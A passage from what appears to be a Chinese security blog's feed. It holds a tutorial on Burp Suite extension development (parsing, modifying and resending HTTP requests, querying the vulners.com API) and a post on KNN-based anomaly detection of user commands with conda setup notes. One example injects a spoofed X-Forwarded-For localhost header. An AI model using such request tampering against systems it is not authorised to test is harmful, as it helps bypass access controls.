包，然后在 burp 重新加载插件，在插件输入框中输入 12346849， 点击按钮，就会在插件日志中打印输入框中的内容了。</p><p><img src="/2021/05/21/burpsuite-develop/1621838299568.png" alt="1621838299568"></p><p><img src="/2021/05/21/burpsuite-develop/1621838343829.png" alt="1621838343829"> </p><h2 id="3-burpsuite的HTTP处理"><a href="#3-burpsuite的HTTP处理" class="headerlink" title="3 burpsuite的HTTP处理"></a>3 burpsuite的HTTP处理</h2><p>开发burpsuite插件关键在于处理http请求和响应</p><h3 id="3-1-查看包的报文信息"><a href="#3-1-查看包的报文信息" class="headerlink" title="3.1 查看包的报文信息"></a>3.1 查看包的报文信息</h3><p>很多插件都是分析HTTP的请求包和响应包，去分析里面的内容实现某种功能。</p><p>HTTP相关处理主要是IHttpListener接口，他有个方法processHttpMessage用来处理HTTP消息，该方法有3个参数。其中toolflag表示burpsuite中流量的形式，比如通过代理，通过扫描等。具体对应值可以查看<a href="https://portswigger.net/burp/extender/api/constant-values.html#burp.IBurpExtenderCallbacks">IBurpExtenderCallbacks接口</a>，例如IBurpExtenderCallbacks.TOOL_PROXY表示代理流量；messageInfo表示HTTP交互报文，我们就通过初该值的处理得到HTTP的request和response报文，具体处理如下：</p><p>（1）Request分析</p><p>首先可以通过messageInfo.getRequest()获得整个请求报文，然后利用IRequestInfo类对报文进行分解，得到header, body,url等信息</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">processHttpMessage</span><span class="token punctuation">(</span><span class="token keyword">int</span> toolFlag<span class="token punctuation">,</span> <span class="token keyword">boolean</span> messageIsRequest<span class="token punctuation">,</span> IHttpRequestResponse messageInfo<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>IRequestInfo analyzeRequest <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">analyzeRequest</span><span class="token punctuation">(</span>messageInfo<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//对Request消息进行解体</span>String request <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>messageInfo<span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获得请求的body</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> body <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>analyzeRequest<span class="token punctuation">.</span><span class="token function">getBodyOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取请求头，返回header参数列表</span>List<span class="token operator">&lt;</span>String<span class="token operator">></span> headers <span class="token operator">=</span> analyzeRequest<span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取请求头的HTTP方法    </span>String method<span class="token operator">=</span>analyzeRequest<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取请求头的参数列表       </span>List<span class="token operator">&lt;</span>IParameter<span class="token operator">></span> Params<span class="token operator">=</span>analyzeRequest<span class="token punctuation">.</span><span class="token function">getParameters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取请求头的URL </span>URL url<span class="token operator">=</span>analyzeRequest<span class="token punctuation">.</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）response分析</p><p>首先直接调用messageInfo.getResponse()获取整个response完整报文，如果想要对response分结构的获取，例如获取response报文的header,body等，需要借助IRequestInfo类对报文进行分解</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">processHttpMessage</span><span class="token punctuation">(</span><span class="token keyword">int</span> toolFlag<span class="token punctuation">,</span> <span class="token keyword">boolean</span> messageIsRequest<span class="token punctuation">,</span> IHttpRequestResponse messageInfo<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> response <span class="token operator">=</span> messageInfo<span class="token punctuation">.</span><span class="token function">getResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获得response完整报文</span>    BurpExtender<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Response："</span><span class="token operator">+</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//对Response消息进行解体</span>    IResponseInfo analyzeResponse <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">analyzeResponse</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//获得执行的状态码</span>    <span class="token keyword">int</span> statusCode<span class="token operator">=</span>analyzeResponse<span class="token punctuation">.</span><span class="token function">getStatusCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//获得header参数</span>    List<span class="token operator">&lt;</span>String<span class="token operator">></span> headers <span class="token operator">=</span> analyzeResponse<span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-修改包重发"><a href="#3-2-修改包重发" class="headerlink" title="3.2 修改包重发"></a>3.2 修改包重发</h3><p>有些插件的功能需要对交互包进行修改，重发，下面提供几个修改点的例子。</p><h4 id="3-2-1-headers的CRUD，并发送新请求"><a href="#3-2-1-headers的CRUD，并发送新请求" class="headerlink" title="3.2.1 headers的CRUD，并发送新请求"></a>3.2.1 headers的CRUD，并发送新请求</h4><p>（1）获得headers</p><pre class="line-numbers language-javascript"><code class="language-javascript">IRequestInfo analyzeRequest <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">analyzeRequest</span><span class="token punctuation">(</span>messageInfo<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//对消息进行解体</span><span class="token comment" spellcheck="true">//获取i请求头，返回header参数列表</span>List<span class="token operator">&lt;</span>String<span class="token operator">></span> headers <span class="token operator">=</span> analyzeRequest<span class="token punctuation">.</span><span class="token function">getHeaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（2）对header的CRUD</p><pre class="line-numbers language-java"><code class="language-java">String xforward<span class="token operator">=</span><span class="token string">"X-Forwarded-For:127.0.0.1"</span><span class="token punctuation">;</span>headers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>xforward<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（3）重新发送改变后的header的请求</p><p>注意重新构建新的Request，这里采用的是buildHttpRequest方法。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">try</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//重组请求信息</span>    <span class="token comment" spellcheck="true">//获得请求的body</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> body <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>analyzeRequest<span class="token punctuation">.</span><span class="token function">getBodyOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> newRequest<span class="token operator">=</span>helpers<span class="token punctuation">.</span><span class="token function">buildHttpMessage</span><span class="token punctuation">(</span>headers<span class="token punctuation">,</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*****************获取 http service**********************/</span>    IHttpService service <span class="token operator">=</span> messageInfo<span class="token punctuation">.</span><span class="token function">getHttpService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//重新发送request</span>    callbacks<span class="token punctuation">.</span><span class="token function">makeHttpRequest</span><span class="token punctuation">(</span>service<span class="token punctuation">,</span> newRequest<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">MalformedURLException</span> e<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2修改URL，然后发送新的请求"><a href="#2-2修改URL，然后发送新的请求" class="headerlink" title="2.2修改URL，然后发送新的请求"></a>2.2修改URL，然后发送新的请求</h4><p>（1）获得原有URL</p><pre class="line-numbers language-java"><code class="language-java">IRequestInfo analyzeRequest <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">analyzeRequest</span><span class="token punctuation">(</span>messageInfo<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//对消息进行解体</span>URL url <span class="token operator">=</span> analyzeRequest<span class="token punctuation">.</span><span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>(2)构建新的URL： URL的CRUD</p><p>注意，URL的new最好再try catch中去做，不然会报错</p><pre class="line-numbers language-java"><code class="language-java">String newUrlString <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"djkslahf@w*5%oi"</span><span class="token punctuation">;</span>URL newUrl<span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">/*****************构建新的URL**********************/</span>    newUrl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>newUrlString<span class="token punctuation">)</span><span class="token punctuation">;</span>    BurpExtender<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"analyzeRequest.newUrl--new :"</span> <span class="token operator">+</span> newUrlString<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">MalformedURLException</span> e<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）重新发送改变后的URL的请求</p><p>注意重新构建新的Request，这里采用的是buildHttpRequest方法。</p><pre class="line-numbers language-java"><code class="language-java">URL newUrl<span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">/*****************构建新的URL**********************/</span>    <span class="token comment" spellcheck="true">/*****************获取 http service**********************/</span>    IHttpService service <span class="token operator">=</span> messageInfo<span class="token punctuation">.</span><span class="token function">getHttpService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/*****************发送一个新的请求**********************/</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> newRequest <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">buildHttpRequest</span><span class="token punctuation">(</span>newUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>    callbacks<span class="token punctuation">.</span><span class="token function">makeHttpRequest</span><span class="token punctuation">(</span>service<span class="token punctuation">,</span> newRequest<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">MalformedURLException</span> e<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-3-修改body"><a href="#2-3-修改body" class="headerlink" title="2.3 修改body"></a>2.3 修改body</h4><h3 id="3-3-重新构建包"><a href="#3-3-重新构建包" class="headerlink" title="3.3 重新构建包"></a>3.3 重新构建包</h3><p>需要借助IExtensionHelpers接口，创建该接口对象helpers。这里以如下包为例：</p><pre><code>POST /api/v3/search/lucene/ HTTP/1.1Host: vulners.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: https://vulners.com/Content-Type: application/jsonOrigin: https://vulners.comContent-Length: 246Connection: closeCookie: _ga=GA1.2.166747250.1624591605; _gid=GA1.2.443724840.1624591605; _gat=1&#123;&quot;query&quot;:&quot;affectedSoftware.name:nginx AND affectedSoftware.version:\&quot;1.17.7\&quot;&quot;,&quot;fields&quot;:[&quot;cvss&quot;,&quot;description&quot;,&quot;id&quot;,]&#125;</code></pre><p>(1)组建header</p><p>header包括Url cookie等信息</p><pre class="line-numbers language-java"><code class="language-java">String VULNERS_API_HOST <span class="token operator">=</span> <span class="token string">"vulners.com"</span><span class="token punctuation">;</span>String VULNERS_API_PATH <span class="token operator">=</span> <span class="token string">"/api/v3/search/lucene"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//"/api/v3/burp/";</span>List<span class="token operator">&lt;</span>String<span class="token operator">></span> headers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>headers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"POST "</span> <span class="token operator">+</span> VULNERS_API_PATH  <span class="token operator">+</span> <span class="token string">"/ HTTP/1.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>headers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"Host: "</span> <span class="token operator">+</span> VULNERS_API_HOST<span class="token punctuation">)</span><span class="token punctuation">;</span>headers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>headers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>headers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"Cookie: xxxxxxx;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）组建body</p><p>首先我们构造出Json结构的body，注意body里可以添加嵌套多层的json。</p><pre class="line-numbers language-java"><code class="language-java">JSONObject jsonBody <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Map mapBody = new HashMap();</span>jsonBody<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"query"</span><span class="token punctuation">,</span> <span class="token string">"affectedSoftware.name:"</span><span class="token operator">+</span>SoftwareName<span class="token operator">+</span><span class="token string">" AND affectedSoftware.version:\""</span><span class="token operator">+</span>SoftwareVersion<span class="token operator">+</span><span class="token string">"\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>List<span class="token operator">&lt;</span>String<span class="token operator">></span> fields<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fields<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"cvss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fields<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"description"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fields<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>jsonBody<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"fields"</span><span class="token punctuation">,</span>fields<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）发送新请求</p><p>首先使用buildHttpMessage重新构造新的request；再调用makeHttpRequest发送新的请求，获取响应值response。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> request <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">buildHttpMessage</span><span class="token punctuation">(</span>headers<span class="token punctuation">,</span> helpers<span class="token punctuation">.</span><span class="token function">stringToBytes</span><span class="token punctuation">(</span>jsonBody<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> response <span class="token operator">=</span> callbacks<span class="token punctuation">.</span><span class="token function">makeHttpRequest</span><span class="token punctuation">(</span>VULNERS_API_HOST<span class="token punctuation">,</span> <span class="token number">443</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>(4)解析response</p><p>将resposne转化为json格式的报文object，就可以精确的取值啦</p><pre class="line-numbers language-java"><code class="language-java">String responseString <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">bytesToString</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>IResponseInfo iResponseInfo <span class="token operator">=</span> helpers<span class="token punctuation">.</span><span class="token function">analyzeResponse</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>String jsonString <span class="token operator">=</span> responseString<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>iResponseInfo<span class="token punctuation">.</span><span class="token function">getBodyOffset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>JSONObject object <span class="token operator">=</span> JSONObject<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>参考连接：</p><p><a href="https://www.secpulse.com/archives/124593.html#goComment">1.从头开发一个BurpSuite数据收集插件</a></p><p><a href="https://www.jianshu.com/p/c7b480a28dc6">2.burp插件开发基础一（JAVA篇) </a></p><p><a href="https://portswigger.net/burp/extender/">3.官方插件编写示例</a></p><p><a href="http://blog.portswigger.net/2012_12_01_archive.html">4官方编写插件博客</a></p><p><a href="https://github.com/bit4woo/burp-api-drops">5.请求包的所有操作</a>  超级推荐</p><p><a href="https://t0data.gitbooks.io/burpsuite/content/chapter16.html">6 如何编写自己的burpsuite</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91/">插件开发</category>
      
      
      <comments>https://m01ly.github.io/2021/05/21/burpsuite-develop/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>机器学习算法之KNN</title>
      <link>https://m01ly.github.io/2021/04/26/machine-learning-classify-knn/</link>
      <guid>https://m01ly.github.io/2021/04/26/machine-learning-classify-knn/</guid>
      <pubDate>Mon, 26 Apr 2021 07:55:26 GMT</pubDate>
      
      <description>&lt;p&gt;的函数：&lt;/p&gt;
&lt;p&gt;词频：FreqDist(words_list), 接受list类型的参数，返回词典，key是元素，value是元素出现的次数&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    fdist = FreqDist(dist).keys()
    dist_max=set(fdist[0:50])
    dist_min = set(fdist[-50:])&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;set()&lt;/strong&gt; 函数创建一个无序不重复元素集，可进行关系测试，删除重复数据，还可以计算交集、差集、并集等。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt;x = set(&amp;#39;runoob&amp;#39;)
&amp;gt;&amp;gt;&amp;gt; y = set(&amp;#39;google&amp;#39;)
&amp;gt;&amp;gt;&amp;gt; x, y
(set([&amp;#39;b&amp;#39;, &amp;#39;r&amp;#39;, &amp;#39;u&amp;#39;, &amp;#39;o&amp;#39;, &amp;#39;n&amp;#39;]), set([&amp;#39;e&amp;#39;, &amp;#39;o&amp;#39;, &amp;#39;g&amp;#39;, &amp;#39;l&amp;#39;]))   # 重复的被删除&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;1-走进KNN&quot;&gt;&lt;a href=&quot;#1-走进KNN&quot; class=&quot;headerlink&quot; title=&quot;1 走进KNN&quot;&gt;&lt;/a&gt;1 走进KNN&lt;/h2&gt;&lt;h3 id=&quot;1-k近邻算法的基本概念，原理以及应用&quot;&gt;&lt;a href=&quot;#1-k近邻算法的基本概念，原理以及应用&quot; class=&quot;headerlink&quot; title=&quot;1.k近邻算法的基本概念，原理以及应用&quot;&gt;&lt;/a&gt;1.k近邻算法的基本概念，原理以及应用&lt;/h3&gt;&lt;p&gt;KNN（K-nearest neighbor）的基本思想非常的简单朴素，即对于一个待预测的样本x ，在训练集中找到&lt;strong&gt;距离&lt;/strong&gt;其最近的k 个近邻 ，得票最高的类作为输出类别即可。当 k=1 时，则称为最近邻。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>的函数：</p><p>词频：FreqDist(words_list), 接受list类型的参数，返回词典，key是元素，value是元素出现的次数</p><pre><code>    fdist = FreqDist(dist).keys()    dist_max=set(fdist[0:50])    dist_min = set(fdist[-50:])</code></pre><p><strong>set()</strong> 函数创建一个无序不重复元素集，可进行关系测试，删除重复数据，还可以计算交集、差集、并集等。</p><pre><code>&gt;&gt;&gt;x = set(&#39;runoob&#39;)&gt;&gt;&gt; y = set(&#39;google&#39;)&gt;&gt;&gt; x, y(set([&#39;b&#39;, &#39;r&#39;, &#39;u&#39;, &#39;o&#39;, &#39;n&#39;]), set([&#39;e&#39;, &#39;o&#39;, &#39;g&#39;, &#39;l&#39;]))   # 重复的被删除</code></pre><h2 id="1-走进KNN"><a href="#1-走进KNN" class="headerlink" title="1 走进KNN"></a>1 走进KNN</h2><h3 id="1-k近邻算法的基本概念，原理以及应用"><a href="#1-k近邻算法的基本概念，原理以及应用" class="headerlink" title="1.k近邻算法的基本概念，原理以及应用"></a>1.k近邻算法的基本概念，原理以及应用</h3><p>KNN（K-nearest neighbor）的基本思想非常的简单朴素，即对于一个待预测的样本x ，在训练集中找到<strong>距离</strong>其最近的k 个近邻 ，得票最高的类作为输出类别即可。当 k=1 时，则称为最近邻。<a id="more"></a></p><p>KNN常见的算法：<br>·Brute Force<br>·K-D Tree<br>·Ball Tree</p><p> <strong>应用：</strong>kNN 可以用来进行分类或者回归 </p><h3 id="2-k近邻算法中k的选取，距离的度量以及特征归一化的必要性"><a href="#2-k近邻算法中k的选取，距离的度量以及特征归一化的必要性" class="headerlink" title="2.k近邻算法中k的选取，距离的度量以及特征归一化的必要性"></a>2.k近邻算法中k的选取，距离的度量以及特征归一化的必要性</h3><p><strong>k过大时：</strong></p><p>如果我们选取较大的k值，就相当于用较大邻域中的训练数据进行预测，这时与输入实例较远的（不相似）训练实例也会对预测起作用，使预测发生错误，k值的增大意味着整体模型变得简单。</p><p>我们想，如果k=N（N为训练样本的个数）,那么无论输入实例是什么，都将简单地预测它属于在训练实例中最多的类。这时，模型是不是非常简单，这相当于你压根就没有训练模型呀！</p><p><strong>k过小时：</strong></p><p>如果我们选取较小的k值，那么就会意味着我们的整体模型会变得复杂，容易发生过拟合！</p><p> <strong>k的选择：</strong>李航博士书上讲到，我们一般选取一个较小的数值，通常采取 交叉验证法来选取最优的k值。（<strong>也就是说，选取k值很重要的关键是实验调参，类似于神经网络选取多少层这种，通过调整超参数来得到一个较好的结果</strong>） </p><h3 id="3-k近邻法的实现：kd树原理的讲解"><a href="#3-k近邻法的实现：kd树原理的讲解" class="headerlink" title="3.k近邻法的实现：kd树原理的讲解"></a>3.k近邻法的实现：kd树原理的讲解</h3><p>4.kd树详细例子讲解</p><p>5.kd树的不足以及最差情况举例</p><p>6.k近邻方法的一些个人总结</p><h2 id="2-KNN应用1"><a href="#2-KNN应用1" class="headerlink" title="2 KNN应用1"></a>2 KNN应用1</h2><p>2.1 使用KNN检测异常操作</p><p>思路：</p><p>数据处理：</p><p><strong>处理数据：</strong></p><p>50个用户数据；每个用户15000条操作序列，每100条作为一个操作序列，所以每个用户的数据为cmd_list[150X100]，其中每个用户15000条操作序列中统计FreqDist统计最频繁使用的前50个dist_max和 最不频繁使用的后50个dist_min。</p><p>KNN只能以标量作为输入。</p><p><strong>特征：</strong>user_cmd_feature（150X3）</p><p>cmd_list中每个操作序列为cmd_block（100个命令）</p><p>f1：统计cmd_block中不重复命令的个数len(set(cmd_block))</p><p>f2: 统计（cmd_block中最频繁使用的前10个与dist_max）的交集个数（len(set()&amp;set())）</p><p>f3:统计（cmd_block中最不频繁使用的前10个与dist_min）的交集个数（len(set()&amp;set())）</p><p><strong>训练：</strong></p><p>user_cmd_feature[0:120]（120X3）：前120个操作序列作为训练序列，后30个操作序列作为测试序列</p><h1 id="anaconda中创建虚拟环境"><a href="#anaconda中创建虚拟环境" class="headerlink" title="anaconda中创建虚拟环境"></a>anaconda中创建虚拟环境</h1><p> 1、用conda创建Python虚拟环境（在conda prompt环境下完成）</p><pre><code>conda create -n douge python=2.7</code></pre><p> (注：该命令只适用于Windows环境；“environment_name”是要创建的环境名；“python=X.X”是选择的Python版本)</p><h3 id="2、激活虚拟环境（在conda-prompt环境下完成）"><a href="#2、激活虚拟环境（在conda-prompt环境下完成）" class="headerlink" title="2、激活虚拟环境（在conda prompt环境下完成）"></a>2、激活虚拟环境（在conda prompt环境下完成）</h3><pre><code>activate douge</code></pre><p> Windows: activate your_env_name(虚拟环境名称)</p><h3 id="3、给虚拟环境安装外部包"><a href="#3、给虚拟环境安装外部包" class="headerlink" title="3、给虚拟环境安装外部包"></a>3、给虚拟环境安装外部包</h3><pre><code>conda install -n douge vulners</code></pre><p> 例如: conda install -n tensorflow pandas</p><h3 id="4、查看已有的环境-当前已激活的环境会显示一个星号"><a href="#4、查看已有的环境-当前已激活的环境会显示一个星号" class="headerlink" title="4、查看已有的环境(当前已激活的环境会显示一个星号)"></a>4、查看已有的环境(当前已激活的环境会显示一个星号)</h3><pre><code>conda info -e</code></pre><h3 